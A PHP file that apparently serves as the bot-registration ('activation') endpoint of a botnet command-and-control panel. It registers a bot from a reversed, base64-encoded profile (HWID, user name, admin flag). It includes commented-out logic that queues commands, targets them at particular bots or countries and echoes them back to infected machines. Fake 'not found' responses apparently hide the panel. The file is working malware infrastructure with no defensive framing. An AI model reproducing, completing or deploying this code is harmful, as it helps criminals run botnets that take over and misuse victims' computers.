<?
include_once('stat.php');
include_once('modules/bot.php');
include_once('modules/config/config.php');
include_once('modules/security.php');

date_default_timezone_set("Europe/Berlin");
$sec = new Security('activation');
$stat = new Stats('activation');
$key = array();

$r_hwid = strval(rand(10000000, 88888888));
$keyarray = strrev('{"win":"Unknown","hwid":"'.$r_hwid.'","UserName":"VBS","Admin":"0","s5":"","s4":"","http":"","ram":"2000MB"}');
	
$input_encoding = 'UTF-8';
$str = base64_encode($keyarray);

if(isset($_POST)):
	
	$user = new Bot($str);
	$cmdarr = array();
	$user->AddUser();
	
	if($user->result == true):
	
		
		/*$idbot = $user->GetBotID();
		$cmdarr = $user->SelectAllCommand($idbot);
		$curr_country = $user->countrycode;
		
		
		if(count($cmdarr)>0):	
		
				$key = array_rand($cmdarr, 1);
				
				$cmdid = intval($cmdarr[$key]['id']);
				$amount = intval($cmdarr[$key]['amount']);
				$forid = intval($cmdarr[$key]['forid']);
				$forcountry = htmlspecialchars_decode($cmdarr[$key]['country'], ENT_COMPAT);
				$cmdtext = htmlspecialchars_decode($cmdarr[$key]['cmd'], ENT_COMPAT);
				
				/* if($amount > 0):
						
					$country = false;
					$target_bot = false;
					
					
					if(strlen($forcountry) !== 0) $country = true;
					if($forid !== 0) $target_bot = true;
					
				
				{}		
						if ($target_bot == true):
							if($user->isMarked($idbot, $cmdid)==false):
								if ($forid == $idbot):
									$user->DoneUp($cmdid);
									$user->MarkSet($idbot, $cmdid);
									echo $cmdtext;
								endif;
							endif;
						endif;
						
						if ($country == true):	
							if (strlen($forcountry) > 0 ):
								if (strtolower($curr_country) == strtolower($forcountry)):
									if($user->isMarked($idbot, $cmdid)==false):
										$user->DoneUp($cmdid);
										$user->MarkSet($idbot, $cmdid);
										echo $cmdtext;
									endif;
								endif;
							endif;
						endif;
						
						if ($country == false && $target_bot == false):	
							if($user->isMarked($idbot, $cmdid)==false):
								$user->DoneUp($cmdid);
								$user->MarkSet($idbot, $cmdid);
								echo $cmdtext;
							endif;
						endif;
		
				else:
					if ($amount == 0):
						if($user->isMarked($idbot, $cmdid)==false):
							$user->DoneUp($cmdid);
							$user->MarkSet($idbot, $cmdid);
							echo $cmdtext;
						else: $sec->NotFound(); endif;
					endif;
				endif; */
				$sec->NotFound();
			//else: $sec->NotFound(); endif;
		else: $sec->NotFound(); endif;
	else:  $sec->NotFound(); endif;
	
	

?>